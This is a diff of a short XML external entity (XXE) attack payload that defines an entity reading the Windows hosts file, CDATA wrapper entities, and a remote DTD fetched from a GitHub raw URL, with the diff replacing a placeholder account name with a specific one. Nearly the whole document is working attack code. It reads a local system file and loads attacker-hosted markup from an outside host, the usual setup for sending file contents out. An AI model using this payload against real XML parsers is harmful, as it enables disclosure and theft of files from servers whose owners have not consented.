@@ -1,5 +1,5 @@
 <!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
-<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/YOUR_USERNAME/xxe-payloads/main/dtd.xml">
+<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/mrlaksh20/payloads/main/dtd.xml">
 %dtd;
